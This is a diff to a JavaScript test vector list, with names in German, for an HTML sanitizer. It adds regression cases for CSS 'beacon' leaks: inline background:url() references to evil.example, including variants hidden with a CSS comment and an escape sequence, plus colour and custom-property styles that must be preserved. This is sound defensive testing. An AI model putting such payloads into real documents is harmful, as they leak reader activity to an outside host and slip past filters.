@@ -80,7 +80,18 @@ const VECTOR_SET = [
     { name: 'Tabelle', html: '<table><tbody><tr><td>Probetext</td></tr></tbody></table>' },
     { name: 'Hervorhebung', html: '<mark>Probetext</mark>' },
     { name: 'Verweis', html: '<a href="https://example.com">Probetext</a>' },
-    { name: 'Schriftart-Element', html: '<font face="Arial">Probetext</font>' }
+    { name: 'Schriftart-Element', html: '<font face="Arial">Probetext</font>' },
+
+    // --- Neue Vektoren zur Beacon-Regression (T-10-30/T-10-31, Plan 10-07) ---
+    { name: 'Beacon: Ressourcen-Referenz doppelt quotiert', html: '<table><tr><td style="background:url(&quot;https://evil.example/LEAK-DQ&quot;)">Zelle</td></tr></table>' },
+    { name: 'Beacon: Ressourcen-Referenz einfach quotiert', html: `<table><tr><td style="background:url('https://evil.example/LEAK-SQ')">Zelle</td></tr></table>` },
+    { name: 'Beacon: Ressourcen-Referenz unquotiert', html: '<table><tr><td style="background:url(https://evil.example/LEAK-UQ)">Zelle</td></tr></table>' },
+    { name: 'Beacon: Verschleierung per CSS-Kommentar im Funktionsnamen', html: '<table><tr><td style="background:u/**/rl(https://evil.example/LEAK-COMMENT)">Zelle</td></tr></table>' },
+    { name: 'Beacon: Verschleierung per CSS-Escape-Sequenz im Funktionsnamen', html: '<table><tr><td style="background:\\75rl(https://evil.example/LEAK-ESCAPE)">Zelle</td></tr></table>' },
+    { name: 'Erhaltung: Rahmen-Deklaration mit Custom-Property-Referenz', html: '<table><tr><td style="border:1px solid var(--border)">Zelle</td></tr></table>' },
+    { name: 'Erhaltung: Hintergrund-Deklaration mit Custom-Property-Referenz', html: '<table><tr><td style="background:var(--bg-elevated)">Zelle</td></tr></table>' },
+    { name: 'Erhaltung: Farbfunktion', html: '<table><tr><td style="color:rgb(255, 0, 0)">Zelle</td></tr></table>' },
+    { name: 'Erhaltung: Hex-Farbwert', html: '<table><tr><td style="color:#ff0000">Zelle</td></tr></table>' }
 ];
 
 // ============================================================
